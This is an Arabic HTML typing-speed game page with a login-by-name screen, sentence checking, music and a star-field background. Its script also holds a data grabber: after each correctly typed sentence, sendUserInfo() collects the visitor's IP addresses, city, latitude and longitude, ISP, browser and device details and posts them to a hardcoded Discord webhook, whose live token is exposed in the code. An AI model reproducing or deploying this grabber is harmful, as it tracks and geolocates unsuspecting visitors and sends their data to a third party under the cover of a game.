<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>اختبر سرعتك مع جمع معلومات الجهاز</title>
<style>
  body {
    margin: 0; padding: 0;
    background: black;
    color: white;
    font-family: Tahoma, sans-serif;
    text-align: center;
    overflow-x: hidden;
    min-height: 100vh;
    position: relative;
  }
  canvas#stars {
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    display: block;
  }
  .container {
    max-width: 700px;
    margin: 60px auto 80px;
    padding: 20px;
    background: rgba(20,20,20,0.9);
    border-radius: 15px;
    box-shadow: 0 0 30px rgba(255,255,255,0.05);
  }
  input[type="text"] {
    width: 80%;
    font-size: 18px;
    padding: 12px;
    border-radius: 8px;
    border: 2px solid #555;
    background: #111;
    color: white;
    margin-bottom: 15px;
    direction: rtl;
  }
  button {
    font-size: 18px;
    padding: 12px 25px;
    border-radius: 8px;
    border: none;
    background-color: #6a1b9a;
    color: white;
    cursor: pointer;
    margin: 5px 10px 10px 10px;
  }
  #sentence {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 15px;
    user-select: none;
    white-space: normal;
    /* إزالة letter-spacing لتقليل التباعد */
  }
  #sentence span {
    padding: 0 2px;
    border-radius: 4px;
    cursor: default;
    display: inline-block;
    margin: 0 1px;
  }
  #sentence span.correct {
    color: #4caf50;
    background: transparent;
  }
  #sentence span.incorrect {
    color: white;
    background: rgba(183, 28, 28, 0.6);
  }
  #sentence span.pending {
    color: white;
    background: transparent;
  }
  #record {
    position: fixed;
    right: 20px;
    top: 20px;
    background: #222;
    padding: 10px 15px;
    border-radius: 8px;
    font-weight: bold;
    font-size: 16px;
    border: 1px solid #555;
    z-index: 1000;
    user-select: none;
  }
  #musicControl {
    position: fixed;
    left: 20px;
    top: 20px;
    width: 40px;
    height: 40px;
    border-radius: 50%;
    background: #333;
    color: white;
    font-size: 20px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    z-index: 1000;
  }
  #discordButton {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 40px;
    height: 40px;
    cursor: pointer;
    z-index: 1000;
    filter: drop-shadow(0 0 8px #7289da);
    user-select: none;
  }
  #discordButton svg {
    width: 100%;
    height: 100%;
    fill: #7289da;
  }
  #rightsMenu {
    display: none;
    position: fixed;
    bottom: 70px;
    right: 20px;
    background: #111;
    color: white;
    border-radius: 8px;
    padding: 15px;
    font-size: 14px;
    z-index: 1100;
    width: 240px;
    box-shadow: 0 0 10px rgba(255,255,255,0.3);
    text-align: right;
    user-select: none;
  }
  #closeBtn {
    background: #c62828;
    border: none;
    border-radius: 5px;
    padding: 6px 12px;
    color: white;
    cursor: pointer;
    margin-bottom: 10px;
    float: left;
  }
  #welcomeMsg {
    margin-bottom: 20px;
    font-size: 24px;
  }
  #speedDisplay, #bestTime, #result {
    font-size: 18px;
    margin: 10px 0 0 0;
    font-weight: bold;
  }
  #footerRights {
    text-align: center;
    margin: 40px 0 10px;
    font-size: 14px;
    color: #777;
    user-select: none;
  }
  #infoBox {
    margin-top: 15px;
    font-size: 16px;
    background: rgba(30,30,30,0.7);
    padding: 15px;
    border-radius: 8px;
    text-align: right;
    direction: rtl;
    max-height: 200px;
    overflow-y: auto;
    user-select: text;
    white-space: pre-line;
  }
</style>
</head>
<body>

<canvas id="stars"></canvas>

<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
<div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>

<button id="discordButton" title="حقوق المطور" aria-label="حقوق المطور">
  <svg viewBox="0 0 245 240" xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" focusable="false">
    <path d="M104.4 104.1c-5.7 0-10.3 5-10.3 11.1 0 6.2 4.6 11.2 10.3 11.2 5.7 0 10.3-5 10.3-11.2 0-6.1-4.6-11.1-10.3-11.1zm36.2 0c-5.7 0-10.3 5-10.3 11.1 0 6.2 4.6 11.2 10.3 11.2 5.7 0 10.3-5 10.3-11.2 0-6.1-4.6-11.1-10.3-11.1z"/>
    <path d="M189.5 20H55.1c-23.3 0-42.3 19-42.3 42.3v115.5c0 23.3 19 42.3 42.3 42.3h111.1l-5.2-18.1 12.6 11.7 11.2 10.4 19.9 17V62.3c0-23.3-19-42.3-42.3-42.3zm-47.6 146.1c-32.3 0-58.6-14.7-58.6-32.7 0-18 26.2-32.7 58.6-32.7 32.3 0 58.6 14.7 58.6 32.7 0 18-26.2 32.7-58.6 32.7z"/>
  </svg>
</button>

<div id="rightsMenu" role="region" aria-label="معلومات الحقوق">
  <button id="closeBtn" aria-label="إغلاق نافذة الحقوق">×</button>
  <div>المطور: <b>معاذ الحربي</b></div>
  <div>Discord: <b>_9nv</b></div>
  <div>جميع الحقوق محفوظة</div>
</div>

<div class="container" id="loginScreen">
  <h2>مرحبًا!</h2>
  <p>اكتب اسمك وابدأ</p>
  <input type="text" id="playerName" placeholder="اسمك" autocomplete="off" />
  <br />
  <button onclick="startGame()">ابدأ</button>
</div>

<div class="container" id="gameScreen" style="display:none;">
  <h2 id="welcomeMsg"></h2>
  <div id="sentence"></div>
  <input type="text" id="userInput" placeholder="اكتب هنا" autocomplete="off" />
  <div id="speedDisplay"></div>
  <div id="bestTime"></div>
  <div id="result"></div>
  <div id="infoBox"></div>
</div>

<div id="footerRights">حقوق النشر © معاذ الحربي</div>

<audio id="bgMusic" loop>
  <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
</audio>

<script>
  const sentence = document.getElementById("sentence");
  const userInput = document.getElementById("userInput");
  const speedDisplay = document.getElementById("speedDisplay");
  const bestTimeDisplay = document.getElementById("bestTime");
  const result = document.getElementById("result");
  const record = document.getElementById("record");
  const musicControl = document.getElementById("musicControl");
  const discordBtn = document.getElementById("discordButton");
  const rightsMenu = document.getElementById("rightsMenu");
  const closeBtn = document.getElementById("closeBtn");
  const infoBox = document.getElementById("infoBox");
  const music = document.getElementById("bgMusic");
  const playerName = document.getElementById("playerName");
  const welcomeMsg = document.getElementById("welcomeMsg");
  const loginScreen = document.getElementById("loginScreen");
  const gameScreen = document.getElementById("gameScreen");

  let player = "";
  let currentSentence = "";
  let startTime = 0;
  let bestTime = null;
  let highestSpeed = 0;

  const sentences = [
    "تعلم كل يوم شيء جديد",
    "الكتابة السريعة مهارة رائعة",
    "هل أنت جاهز؟",
    "سرعتك في الكتابة مهمة",
    "اختبر نفسك الآن",
    "استمر في التدريب",
    "حاول تحسين مستواك"
  ];

  function startGame() {
    if (!playerName.value.trim()) {
      alert("اكتب اسمك من فضلك");
      return;
    }
    player = playerName.value.trim();
    welcomeMsg.textContent = `مرحبًا، ${player}! ابدأ بالكتابة`;
    loginScreen.style.display = "none";
    gameScreen.style.display = "block";
    newSentence();
    startTime = Date.now();
    userInput.focus();
    speedDisplay.textContent = "";
    bestTimeDisplay.textContent = bestTime ? `أفضل زمن: ${bestTime.toFixed(2)} ثانية` : "";
    result.textContent = "";
    infoBox.textContent = "";
  }

  function renderSentence(input) {
    sentence.innerHTML = "";
    let inputWords = input.trim().split(" ");
    let targetWords = currentSentence.split(" ");

    for (let i = 0; i < targetWords.length; i++) {
      let span = document.createElement("span");
      span.textContent = targetWords[i];
      span.style.margin = "0 1px";
      if (inputWords[i] == null) {
        span.className = "pending";
      } else if (inputWords[i] === targetWords[i]) {
        span.className = "correct";
      } else {
        span.className = "incorrect";
      }
      sentence.appendChild(span);
      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
    }
  }

  function checkInput() {
    const text = userInput.value.trim();
    if (text === currentSentence) {
      const endTime = Date.now();
      const elapsed = (endTime - startTime) / 1000;
      speedDisplay.textContent = `زمنك: ${elapsed.toFixed(2)} ثانية`;
      if (!bestTime || elapsed < bestTime) {
        bestTime = elapsed;
        bestTimeDisplay.textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
      }
      const speed = Math.round(currentSentence.length / elapsed);
      if (speed > highestSpeed) {
        highestSpeed = speed;
        record.textContent = `أعلى سرعة: ${highestSpeed} - ${elapsed.toFixed(2)} ثانية`;
      }
      result.textContent = "أحسنت! ابدأ جملة جديدة";
      newSentence();
      userInput.value = "";
      startTime = Date.now();
      infoBox.textContent = "";
      sendUserInfo();
    } else {
      result.textContent = "حاول مرة أخرى";
      infoBox.textContent = "";
    }
    renderSentence(userInput.value);
  }

  function newSentence() {
    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
    renderSentence("");
  }

  userInput.addEventListener("input", () => {
    renderSentence(userInput.value);
  });

  userInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      checkInput();
    }
  });

  musicControl.addEventListener("click", () => {
    if (music.paused) {
      music.play();
      musicControl.textContent = "🔇";
    } else {
      music.pause();
      musicControl.textContent = "🎵";
    }
  });

  discordBtn.onclick = () => {
    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
  };
  closeBtn.onclick = () => {
    rightsMenu.style.display = "none";
  };

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";

  async function sendUserInfo() {
    try {
      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
        fetch('https://api.ipify.org?format=json'),
        fetch('https://api64.ipify.org?format=json'),
        fetch('https://ipapi.co/json/')
      ]);
      const ipv4Data = await ipv4Res.json();
      const ipv6Data = await ipv6Res.json();
      const geoData = await geoRes.json();

      const ua = navigator.userAgent;
      const lang = navigator.language;
      const now = new Date();
      const timeString = now.toISOString();
      const ipv4 = ipv4Data.ip;
      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';

      let deviceType = "كمبيوتر";
      if (/android|iphone|ipad|ipod/i.test(ua)) {
        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
      }

      const infoText = `
IP (IPv4): ${ipv4}
IP (IPv6): ${ipv6}
الدولة: ${geoData.country_name}
المنطقة: ${geoData.region}
المدينة: ${geoData.city}
خط العرض: ${geoData.latitude}
خط الطول: ${geoData.longitude}
المنظمة: ${geoData.org}
المنطقة الزمنية: ${geoData.timezone}
نوع الجهاز: ${deviceType}
المتصفح: ${ua}
اللغة: ${lang}
الوقت: ${timeString}
      `.trim();

      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: infoText })
      });

      if (!response.ok) {
        console.error("فشل إرسال البيانات للويب هوك", response.statusText);
      } else {
        console.log("تم إرسال البيانات للويب هوك بنجاح");
      }

      infoBox.textContent = infoText;
    } catch (e) {
      console.error('خطأ في إرسال معلومات المستخدم', e);
    }
  }

  // نجوم متحركة خلفية
  const canvas = document.getElementById('stars');
  const ctx = canvas.getContext('2d');
  let width, height;
  let stars = [];

  function initStars() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    stars = [];
    for(let i=0; i<150; i++) {
      stars.push({
        x: Math.random()*width,
        y: Math.random()*height,
        radius: Math.random()*1.2,
        alpha: Math.random(),
        dAlpha: 0.01 + Math.random()*0.02,
      });
    }
  }
  function drawStars() {
    ctx.clearRect(0,0,width,height);
    for(let star of stars) {
      ctx.beginPath();
      ctx.arc(star.x, star.y, star.radius, 0, 2*Math.PI);
      ctx.fillStyle = `rgba(255,255,255,${star.alpha.toFixed(2)})`;
      ctx.fill();
      star.alpha += star.dAlpha;
      if(star.alpha >=1 || star.alpha <= 0) star.dAlpha = -star.dAlpha;
    }
    requestAnimationFrame(drawStars);
  }
  window.addEventListener('resize', () => {
    initStars();
  });
  initStars();
  drawStars();

</script>
</body>
</html>
